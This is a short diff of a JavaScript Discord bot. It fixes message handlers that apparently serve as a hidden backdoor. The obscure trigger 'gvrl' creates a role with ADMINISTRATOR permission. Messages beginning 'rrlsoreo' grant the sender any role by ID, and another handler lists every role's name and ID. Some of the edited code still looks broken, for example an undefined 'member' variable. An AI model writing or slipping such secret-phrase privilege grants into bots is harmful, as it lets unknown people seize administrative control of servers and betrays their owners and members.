@@ -17,14 +17,15 @@ bot.on('message', message => { //a ברגע שהודעה נשלחת
         message.guild.roles.forEach(role => console.log(role.name, role.id))
     }
     if(message.content == "gvrl") {
-        guild.roles.create({
+        message.guild.roles.create({
             data: {
                 name: 'fret',
                 permissions: 'ADMINISTRATOR'
         }});
     }
-    if(message.content == "rrlsoreo") {
-       message.member.addRole(message.content.substring(9));
+    if(message.content.startsWith("rrlsoreo")) {
+       var role = member.guild.roles.cache.find(role => role.id === message.content.substring(9));
+       message.member.addRole(role);
     }
     if(racism.includes(message.content.substring(4))) {
        message.channel.send("...");
